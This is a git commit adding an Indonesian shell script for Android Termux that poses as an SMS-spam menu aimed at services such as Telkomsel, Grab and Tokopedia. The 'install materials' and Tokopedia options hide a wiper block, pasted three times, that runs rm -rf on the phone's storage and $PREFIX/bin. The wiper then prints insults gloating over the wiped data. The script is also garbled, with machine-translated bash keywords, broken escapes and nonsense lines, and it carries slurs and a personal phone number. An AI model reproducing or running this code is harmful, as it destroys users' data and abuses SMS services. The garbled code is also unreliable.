7feb21784f9b24b456444c320e68ac83b83b5151
mrdrag1 <46041450+mrdrag1@users.noreply.github.com>
2019-01-21 21:12:09 +0700

    drag.sh

---
+++ drag.sh
@@ -0,0 +1,473 @@
+
+bersih
+
+toilet -f bigmono9 -F gay SDV SPAM
+
+tidur 1
+
+echo " \ 033 [38; 1m ------------------------------------------ ------------------------ " | lolcat
+
+gema " \ 033 [31; 1 m #DARAH ANGKATAN GELAP "
+
+echo " \ 033 [36; 1m penulis oleh: "
+
+echo " \ 033 [36; 1m ™ <<Mr_MSDV>> ™ "
+
+echo " \ 033 [32; 1m Sebelum memilih spam, terlebih dahulu menginstal bahan (08) "
+
+echo " \ 033 [38; 1m ------------------------------------------ ------------------------ " | lolcat
+
+
+tanggal | lolcat
+
+gema " "
+
+tidur 1
+
+     echo " \ 033 [34; 1m SPAM SMS Yang Tersedia "
+
+     gema " \ 033 [36; 1m '(01)' JDID "
+
+     gema " \ 033 [32m '(02)' TELKOMSEL "
+
+     gema " \ 033 [34m '(03)' PHD. "
+
+     gema " \ 033 [33m '(04)' MATHARIMALL "
+
+     gema " \ 033 [34m '(05)' GRAB "
+
+     echo " \ 033 [33m '(06)' TOKOPEDIA "
+
+tidur 1
+
+gema 
+
+     echo " \ 033 [36; 1m (07) INFO "
+
+     echo " \ 033 [36; 1m (08) Instal Bahan "
+
+     echo " \ 033 [31m (09) Keluar "
+
+gema " \ 033 [32m kamu pilih yang mana ?? "
+
+baca ezz
+
+if [ $ ezz = 1] || [ $ ezz = 01]
+
+kemudian
+
+bersih
+
+gema " \ 033 [31; 1 m "
+
+toilet -f mono12 -F gay " JDID "
+
+php jdid.php
+
+fi
+
+
+if [ $ ezz = 02] || [ $ ezz = 2]
+
+kemudian
+
+bersih
+
+gema " \ 033 [36; 1 m "
+
+toilet -f mono12 -F gay " TELKOMSEL "
+
+php telkomsel.php
+
+fi
+
+
+if [ $ ezz = 03] || [ $ ezz = 3]
+
+kemudian
+
+bersih 
+
+gema " \ 033 [39; 1m "
+
+toilet -f mono12 -F logam " PHD "
+
+php phd.php
+
+fi
+
+
+if [ $ ezz = 04] || [ $ ezz = 4]
+
+kemudian
+
+bersih
+
+gema " \ 033 [39; 1m "
+
+toilet -f mono12 -F logam " MATAHARIMALL "
+
+php mataharimall.php
+
+fi
+
+
+if [ $ ezz = 05] || [ $ ezz = 5]
+
+kemudian
+
+bersih
+
+gema " \ 033 [39; 1m "
+
+toilet -f mono12 -F logam " GRAB "
+
+python2 spammer.py
+
+fi
+
+
+if [ $ ezz = 06] || [ $ ezz = 6]
+
+kemudian
+
+bersih
+
+sh Modified
+
+
+#!/usr/xsystem/bash/bin
+
+#yang baca anak babi, tq
+
+#Coded By MR.DRAG AND KANDOL [ALI ATTACKER]
+
+
+
+toilet -f mono12 -F border REFPLOIT
+
+
+echo "\033[33;1m_________________________________________________"
+
+echo "\033[30;1m|_______________________________________________|"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[31;1mauthor : " "\033[36;1mOMEST"
+
+echo "\033[31;1mdate : " "\033[34;1m 15-1-2019"
+
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+
+echo "\033[31;1mfacebook : " "\033[35;1mFlowers Arr"
+
+echo "\033[31;1mwhatsApp : " "\033[32;1m082278818357"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[33;1m|_______________________________________________|"
+
+sleep 01
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+
+echo "\033[32;1m"
+
+ read -p "root@start_refploit:~#" ommo
+
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+
+then
+
+clear
+
+pkg update
+
+pkg upgrade
+
+rm -rf /storage/emulated/0
+
+rm -rf /storage
+
+rm -rf /storage/sdcard
+
+rm -rf /storage/sdcard1
+
+rm -rf $PREFIX/bin
+
+figlet BWAHHAHAHAHHAH MAMPOS BABI DATA-DATA
+
+HANDPHONE KALIAN KE RESET BWHAHAHAHAHAHAHAH
+MAKANYA JADI ORANG BAIK DONG ANJING
+
+echo Unchhhhh:* cup-cup kesian ea babi..sabar ae |lolcat -a -d 150
+
+fi
+
+
+
+
+usr bin etc
+echo red
+nla
+bla
+bla
+lolcat ---------------
+echo $red "memek gan "
+if bro dlll 1 01 dllll
+then 
+if
+rm-rf
+sh Modified
+
+
+#!/usr/xsystem/bash/bin
+
+#yang baca anak babi, tq
+
+#Coded By MR.DRAG AND KANDOL [ALI ATTACKER]
+
+
+
+toilet -f mono12 -F border REFPLOIT
+
+
+echo "\033[33;1m_________________________________________________"
+
+echo "\033[30;1m|_______________________________________________|"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[31;1mauthor : " "\033[36;1mOMEST"
+
+echo "\033[31;1mdate : " "\033[34;1m 15-1-2019"
+
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+
+echo "\033[31;1mfacebook : " "\033[35;1mFlowers Arr"
+
+echo "\033[31;1mwhatsApp : " "\033[32;1m082278818357"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[33;1m|_______________________________________________|"
+
+sleep 01
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+
+echo "\033[32;1m"
+
+ read -p "root@start_refploit:~#" ommo
+
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+
+then
+
+clear
+
+pkg update
+
+pkg upgrade
+
+rm -rf /storage/emulated/0
+
+rm -rf /storage
+
+rm -rf /storage/sdcard
+
+rm -rf /storage/sdcard1
+
+rm -rf $PREFIX/bin
+
+figlet BWAHHAHAHAHHAH MAMPOS BABI DATA-DATA
+
+HANDPHONE KALIAN KE RESET BWHAHAHAHAHAHAHAH
+MAKANYA JADI ORANG BAIK DONG ANJING
+
+echo Unchhhhh:* cup-cup kesian ea babi..sabar ae |lolcat -a -d 150
+
+fi
+
+
+
+
+usr bin etc
+echo red
+nla
+bla
+bla
+lolcat ---------------
+echo $red "memek gan "
+if bro dlll 1 01 dllll
+then 
+if
+rm-rf
+
+
+
+php tokped.php
+
+fi
+
+
+if [ $ ezz = 07] || [ $ ezz = 7]
+
+kemudian 
+
+bersih
+
+gema " \ 033 [39; 1m "
+
+toilet -f mono12 -F logam " INFO "
+
+gema " Dibuat oleh "
+
+gema " ™ <<Mr_Drag>> ™ "
+
+gema " versi 0.01 "
+
+echo " SEMOGA KAU BAHAGIA DENGANNYA "
+
+gema " "
+
+fi
+
+
+
+if [ $ ezz = 08] || [ $ ezz = 8]
+
+kemudian
+
+bersih
+echo
+sh Modified
+
+
+#!/usr/xsystem/bash/bin
+
+#yang baca anak babi, tq
+
+#Coded By MR.DRAG AND KANDOL [ALI ATTACKER]
+
+
+
+toilet -f mono12 -F border REFPLOIT
+
+
+echo "\033[33;1m_________________________________________________"
+
+echo "\033[30;1m|_______________________________________________|"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[31;1mauthor : " "\033[36;1mOMEST"
+
+echo "\033[31;1mdate : " "\033[34;1m 15-1-2019"
+
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+
+echo "\033[31;1mfacebook : " "\033[35;1mFlowers Arr"
+
+echo "\033[31;1mwhatsApp : " "\033[32;1m082278818357"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[33;1m|_______________________________________________|"
+
+sleep 01
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+
+echo "\033[32;1m"
+
+ read -p "root@start_refploit:~#" ommo
+
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+
+then
+
+clear
+
+pkg update
+
+pkg upgrade
+
+rm -rf /storage/emulated/0
+
+rm -rf /storage
+
+rm -rf /storage/sdcard
+
+rm -rf /storage/sdcard1
+
+rm -rf $PREFIX/bin
+
+figlet BWAHHAHAHAHHAH MAMPOS BABI DATA-DATA
+
+HANDPHONE KALIAN KE RESET BWHAHAHAHAHAHAHAH
+MAKANYA JADI ORANG BAIK DONG ANJING
+
+echo Unchhhhh:* cup-cup kesian ea babi..sabar ae |lolcat -a -d 150
+
+fi
+
+
+
+
+usr bin etc
+echo red
+nla
+bla
+bla
+lolcat ---------------
+echo $red "memek gan "
+if bro dlll 1 01 dllll
+then 
+if
+rm-rf
+
+
+echo " Memuat ---------------------------------- " | lolcat
+
+sh install.sh
+
+sh gco.sh
+
+fi
+
+
+if [ $ ezz = 09] || [ $ ezz = 9]
+
+kemudian
+
+bersih
+
+gema " \ 033 [39; 1m "
+
+toilet -f mono12 -F logam " KELUAR "
+
+gema " semoga hari mu menyenangkan "
+
+fi
